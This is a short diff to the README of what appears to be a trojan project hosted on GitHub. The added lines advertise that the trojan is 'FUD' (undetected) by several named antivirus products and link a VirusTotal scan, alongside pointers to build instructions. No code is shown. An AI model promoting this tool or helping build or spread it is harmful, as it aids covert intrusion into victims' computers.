@@ -4,6 +4,9 @@
 ###### For more information please go to my [Info Page](https://airstrike.school/Socrates)
 ###### To make a .exe build please visit the [Documentation Wiki](https://github.com/GiveUsername/ShittyTrojan.py/wiki)
 ###### If you want to see what I'm planning on adding next, click [here](https://github.com/GiveUsername/ShittyTrojan.py/wiki/Upcoming-Updates)
+###### Currently FUD on Malwarebytes, SentinelOne, Sophos, Microsoft, McAffee.
+###### Detected on known AV's: Kaspersky, Avast, AVG.
+###### [View VirusTotal Report](https://www.virustotal.com/gui/file/bf3306f6dcfa56a2f5f737b22a2ce82b5074f636762b19ab39dce171fde581f7/detection)
 
 # Commands
 
